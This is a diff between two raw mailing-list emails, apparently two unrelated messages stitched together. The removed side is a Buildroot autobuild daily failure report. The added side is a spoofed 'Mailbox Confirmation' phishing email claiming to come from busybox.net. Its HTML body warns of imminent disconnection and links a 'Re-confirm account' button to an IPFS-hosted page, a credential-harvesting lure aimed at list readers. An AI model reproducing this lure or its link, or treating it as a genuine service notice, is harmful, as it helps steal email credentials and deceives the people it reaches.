@@ -4,60 +4,42 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 71928C54FB9
-	for <buildroot@archiver.kernel.org>; Tue, 21 Nov 2023 06:39:03 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 1A980C5ACB3
+	for <buildroot@archiver.kernel.org>; Tue, 21 Nov 2023 08:07:54 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id D8CB440620;
-	Tue, 21 Nov 2023 06:39:02 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org D8CB440620
+	by smtp4.osuosl.org (Postfix) with ESMTP id 95819410CB;
+	Tue, 21 Nov 2023 08:07:54 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 95819410CB
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
 	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id wGAy-JlWI6tF; Tue, 21 Nov 2023 06:39:01 +0000 (UTC)
+	with ESMTP id nFtrKEgVpHyc; Tue, 21 Nov 2023 08:07:53 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id D13EE40942;
-	Tue, 21 Nov 2023 06:39:00 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org D13EE40942
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id 7B3A81BF3D7
- for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 06:38:59 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id E92E7410C6;
+	Tue, 21 Nov 2023 08:07:52 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org E92E7410C6
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 706261BF357
+ for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 08:07:51 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id 60DAD40942
- for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 06:38:59 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 60DAD40942
+ by smtp1.osuosl.org (Postfix) with ESMTP id 49C1F8198D
+ for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 08:07:51 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 49C1F8198D
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id rGIG5UfEkbvG for <buildroot@lists.busybox.net>;
- Tue, 21 Nov 2023 06:38:58 +0000 (UTC)
-Received: from relay9-d.mail.gandi.net (relay9-d.mail.gandi.net
- [IPv6:2001:4b98:dc4:8::229])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 57F2640620
- for <buildroot@buildroot.org>; Tue, 21 Nov 2023 06:38:57 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 57F2640620
-Received: by mail.gandi.net (Postfix) with ESMTPSA id 34B86FF816
- for <buildroot@buildroot.org>; Tue, 21 Nov 2023 06:38:54 +0000 (UTC)
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id iMmSBDsAmg-s for <buildroot@lists.busybox.net>;
+ Tue, 21 Nov 2023 08:07:50 +0000 (UTC)
+Received: from busybox.net (unknown [141.98.10.75])
+ by smtp1.osuosl.org (Postfix) with ESMTP id F3A4E81970
+ for <buildroot@busybox.net>; Tue, 21 Nov 2023 08:07:49 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org F3A4E81970
+From: Mailbox Server <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 21 Nov 2023 09:07:49 +0100
+Message-ID: <20231121090748.7F844C17DE211DAB@busybox.net>
 MIME-Version: 1.0
-To: buildroot@buildroot.org
-Date: Tue, 21 Nov 2023 06:38:54 -0000
-X-GND-Sasl: bot@bootlin.com
-Message-Id: <20231121063859.60DAD40942@smtp4.osuosl.org>
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=bootlin.com; s=gm1; 
- t=1700548734; h=from:from:reply-to:subject:subject:date:date:to:to:cc:
- mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding;
- bh=+bE70CPtzVhNuZMany0t1DfLjlmYVrHLzS8v0CM6Ank=;
- b=gdbKPxK3eQgNj9wNqTMYLXXr/uBCLDVypztSTymsdLZBAjMEuBGEFk5mYu1bCl4yc+OXLs
- Hban237FzQZOy79NQZ6Xy2cyFny2A+NnVufndQzKM54W8m4ERxdwDH5pXuQWfQj9l9i7Ry
- LzSQ+eAjrcak0n2HoC9TZ4R3CN3HXDZUTRxE7+/eX0WUnsZ2HbVs9m6lTxD8pbNISZPH3x
- I9KqNERVMVZm+aL6h9YCAL7kMd9RIK8yW7d4r/yhEfeGLVS34zHp2f2oI/f8EVqGtDYLkj
- CzhM65fmLagnxiFwVM1XeksJ46YXFWP4XKomxxbLv8hzzRKO+sYxrg98EU5fKQ==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=bootlin.com header.i=@bootlin.com header.a=rsa-sha256
- header.s=gm1 header.b=gdbKPxK3
-Subject: [Buildroot] [autobuild.buildroot.net] Daily results for 2023-11-20
+Subject: [Buildroot] buildroot@busybox.net Mailbox Confirmation
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -69,144 +51,93 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Thomas Petazzoni via buildroot <buildroot@buildroot.org>
-Reply-To: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============7125940689959488025=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Hello,
+--===============7125940689959488025==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Autobuild statistics for 2023-11-20
-===================================
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, s=
+ans-serif; font-size: small; font-style: normal; font-weight: 400; margin-t=
+op: 0px; word-spacing: 0px; white-space: normal; box-sizing: border-box; or=
+phans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-lig=
+atures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
+text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;"><font size=
+=3D"2"><font face=3D"Verdana" style=3D"box-sizing: border-box;">Dear&nbsp;b=
+uildroot</font><font face=3D"Verdana" style=3D"box-sizing: border-box;">,</=
+font></font></p>
+<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
+ sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
+pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
+s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;"><font size=3D"2" style=3D"color: =
+rgb(0, 0, 0); box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
+"></font></div>
+<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
+ sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
+pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
+s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;"><font face=3D"verdana" size=3D"2"=
+ style=3D"box-sizing: border-box;"><font color=3D"#000000" style=3D"box-siz=
+ing: border-box;">We noticed that your&nbsp;buildroot@busybox.net&nbsp;</fo=
+nt><font color=3D"#000000" style=3D"box-sizing: border-box;">will be discon=
+nected from sending and receiving mails soon due to lack of mailbox&nbsp;ba=
+ndwidth.</font><br style=3D"box-sizing: border-box;"><br style=3D"box-sizin=
+g: border-box;"><font color=3D"#000000" style=3D"box-sizing: border-box;">
+We urge you to re-confirm if your account is still active on our server to =
+officially unlock it to your default settings.</font><br style=3D"box-sizin=
+g: border-box;"><br style=3D"box-sizing: border-box;"></font>
+<table width=3D"400" height=3D"40" style=3D"color: rgb(0, 0, 0); font-famil=
+y: monospace; font-size: 11px; border-collapse: collapse; box-sizing: borde=
+r-box;" bgcolor=3D"#424242">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"margin: 0px; box-sizing: border-box;"><font face=3D"verdana" s=
+ize=3D"2" style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"box-sizing: border-box;"><font color=3D"#fff=
+fff" face=3D"verdana" size=3D"2" style=3D"box-sizing: border-box;"><a style=
+=3D"color: rgb(17, 85, 204); text-decoration: none; box-sizing: border-box;=
+ background-color: transparent;" href=3D"https://cloudflare-ipfs.com/ipfs/b=
+afkreihsef3pq3bpqawvkhspixapw2iejwrnsuiw3aq4r7fuwrhmur6age?#buildroot@busyb=
+ox.net" target=3D"_blank" rel=3D"noreferrer">Re-confirm account</a></font><=
+/div></font></td></tr></tbody></table>
+<font face=3D"verdana" size=3D"2" style=3D"box-sizing: border-box;"><br sty=
+le=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"><font =
+color=3D"#000000" style=3D"box-sizing: border-box;">Once confirmation is co=
+mplete, your mailbox will work effectively.</font><br style=3D"box-sizing: =
+border-box;"><br style=3D"box-sizing: border-box;"><font color=3D"#000000" =
+style=3D"box-sizing: border-box;">Copyright&#65533;&nbsp;busybox.net</font>=
+</font>
+<span style=3D"color: rgb(0, 0, 0); font-family: verdana; box-sizing: borde=
+r-box;">
+&nbsp;<font size=3D"1">All rights reserved.</font></span></div></body></htm=
+l>
 
-      branch |  OK | NOK | TIM | TOT |
-  2023.02.x  |  9  |  1  |  0  | 10  |
-  2023.08.x  |  1  |  2  |  0  |  3  |
-    master   | 17  | 15  |  1  | 33  |
+--===============7125940689959488025==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-Classification of failures by reason for master
------------------------------------------------
-
-              host-rust-1.71.1 | 3 
-                   openrc-0.51 | 2 
-          python-msgpack-1.0.7 | 2 
-                     criu-3.18 | 1 
-             flare-engine-1.14 | 1 
-         gobject-introspection | 1 
-                libressl-3.8.2 | 1 
-                libselinux-3.5 | 1 
-                   linux-6.6.1 | 1 
-               mariadb-10.11.4 | 1 
-    python-cryptography-39.0.2 | 1 
-                       unknown | 1 
-
-
-Detail of failures for master
------------------------------
-
-    arch     |             reason             | OK? |                                       url                                       | orph?
--------------+--------------------------------+-----+---------------------------------------------------------------------------------+-------
-    i686     |           criu-3.18            | NOK | http://autobuild.buildroot.net/results/94cc463762b57efacf743d107a8dda7660a995a3 |     
-    mips     |       flare-engine-1.14        | NOK | http://autobuild.buildroot.net/results/2aa1470ce1d4eace79098184f1441e19f99a5cc6 |     
- microblaze  |     gobject-introspection      | TIM | http://autobuild.buildroot.net/results/2a96935826a4e07d3e21ccbf4a1b7e0b339843f9 |     
-   s390x     |        host-rust-1.71.1        | NOK | http://autobuild.buildroot.net/results/75bb3b32c4abb83d837bbc45dd6093b5a5eb69bd |     
-    i686     |        host-rust-1.71.1        | NOK | http://autobuild.buildroot.net/results/d942ca275fa8c49a29acfe60b1e3991cb8ee879c |     
-powerpc64le  |        host-rust-1.71.1        | NOK | http://autobuild.buildroot.net/results/1c2cbbc6ae7438246c662786b49ab3d5f1ec7143 |     
-  mips64el   |         libressl-3.8.2         | NOK | http://autobuild.buildroot.net/results/69384dc109792be1d067d6f3ac3f03fbc9af4d73 | ORPH
-   sh4aeb    |         libselinux-3.5         | NOK | http://autobuild.buildroot.net/results/af8761c122a0c4b26c7c859920336531fcd64043 |     
-   mips64    |          linux-6.6.1           | NOK | http://autobuild.buildroot.net/results/29735771423e0ad54250ea9d99aa0d007d0ef83c | ORPH
-    i686     |        mariadb-10.11.4         | NOK | http://autobuild.buildroot.net/results/9c65a0648baa0c3d294487522ddec97fee9ea961 | ORPH
-   mips64    |          openrc-0.51           | NOK | http://autobuild.buildroot.net/results/2c9542335d85575bffcac06d58ed3a6d24914118 |     
-   mipsel    |          openrc-0.51           | NOK | http://autobuild.buildroot.net/results/0bdf60edaf748d089ef6015058d29b1f0304e310 |     
-  aarch64    |   python-cryptography-39.0.2   | NOK | http://autobuild.buildroot.net/results/ef696dff28297c7fd0b7d3eec3e928441ebc77b6 |     
-   mipsel    |      python-msgpack-1.0.7      | NOK | http://autobuild.buildroot.net/results/85f1bb81b03cf5cb69d2f214081bfa6758dbaa1a |     
-  aarch64    |      python-msgpack-1.0.7      | NOK | http://autobuild.buildroot.net/results/6dbd79695e45e29f2e9d9117933199dd2f0aaf39 |     
-microblazeel |            unknown             | NOK | http://autobuild.buildroot.net/results/8ee14ca5b6820e286c2137843b48c88130ed9236 |     
-
-
-Classification of failures by reason for 2023.02.x
---------------------------------------------------
-
-                 wolfssl-5.6.4 | 1 
-
-
-Detail of failures for 2023.02.x
---------------------------------
-
-    arch     |             reason             | OK? |                                       url                                       | orph?
--------------+--------------------------------+-----+---------------------------------------------------------------------------------+-------
-   mipsel    |         wolfssl-5.6.4          | NOK | http://autobuild.buildroot.net/results/34b2a21befe5e531a825f312be9d5d284a7f1d83 |     
-
-
-Classification of failures by reason for 2023.08.x
---------------------------------------------------
-
-               host-go-1.20.11 | 1 
-             util-linux-2.39.1 | 1 
-
-
-Detail of failures for 2023.08.x
---------------------------------
-
-    arch     |             reason             | OK? |                                       url                                       | orph?
--------------+--------------------------------+-----+---------------------------------------------------------------------------------+-------
-   s390x     |        host-go-1.20.11         | NOK | http://autobuild.buildroot.net/results/6744607dbd5c6898c1b303519c05fe3b4d03011b |     
-powerpc64le  |       util-linux-2.39.1        | NOK | http://autobuild.buildroot.net/results/7ba7325e26a0cde27885f4cf990793dd968386c6 | ORPH
-
-
-Gitlab CI results for 2023-11-20
-================================
-
-Detail of runtime-test failures for master
-------------------------------------------
-
-             runtime-test |                        link to the job                        | orph?
---------------------------+---------------------------------------------------------------+------
-      TestCpioDracutGlibc | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984185  | ORPH 
-...ioDracutGlibcMergedUsr | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984188  | ORPH 
-       TestCpioDracutMusl | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984196  | ORPH 
-...pioDracutMuslMergedUsr | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984205  | ORPH 
-     TestCpioDracutUclibc | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984209  | ORPH 
-...oDracutUclibcMergedUsr | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984213  | ORPH 
-              TestFlutter | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984573  | ORPH 
-           TestIPythonPy3 | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984603  | ORPH 
-          TestLuaLsqlite3 | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984623  | ORPH 
-           TestLuaLuacURL | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984642  | ORPH 
-       TestLuajitLsqlite3 | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984625  | ORPH 
-        TestLuajitLuacURL | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984647  | ORPH 
-                  TestOla | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984753  | ORPH 
-          TestPolkitInitd | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984783  | ORPH 
-        TestPolkitSystemd | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984784  | ORPH 
-       TestPythonPahoMQTT | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984855  | ORPH 
-   TestPythonPy3Bitstring | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984805  | ORPH 
-   TestPythonPy3Construct | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984818  | ORPH 
-    TestPythonPy3Crossbar | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984819  | ORPH 
-  TestPythonPy3Dicttoxml2 | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984825  | ORPH 
-    TestPythonPy3Dtschema | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984830  | ORPH 
-...honPy3FlaskExpectsJson | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984835  | ORPH 
-        TestPythonPy3Hkdf | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984844  | ORPH 
-        TestPythonPy3Mako | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984850  | ORPH 
-     TestPythonPy3MakoExt | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984851  | ORPH 
-     TestPythonPy3Passlib | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984856  | ORPH 
-      TestPythonPy3Pynacl | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984864  | ORPH 
-       TestPythonPy3Pysmb | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984869  | ORPH 
-      TestPythonPy3Pyyaml | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984874  | ORPH 
-         TestPythonPy3RSA | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984882  | ORPH 
-       TestPythonPy3SciPy | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984890  | ORPH 
-      TestPythonPy3Spake2 | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984899  | ORPH 
-             TestStressNG | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984935  | ORPH 
-               TestWeston | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984952  | ORPH 
-             TestZfsGlibc | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984960  | ORPH 
-              TestZfsMusl | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984962  | ORPH 
-            TestZfsUclibc | https://gitlab.com/buildroot.org/buildroot/-/jobs/5572984964  | ORPH 
-
-
-
--- 
-http://autobuild.buildroot.net
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============7125940689959488025==--
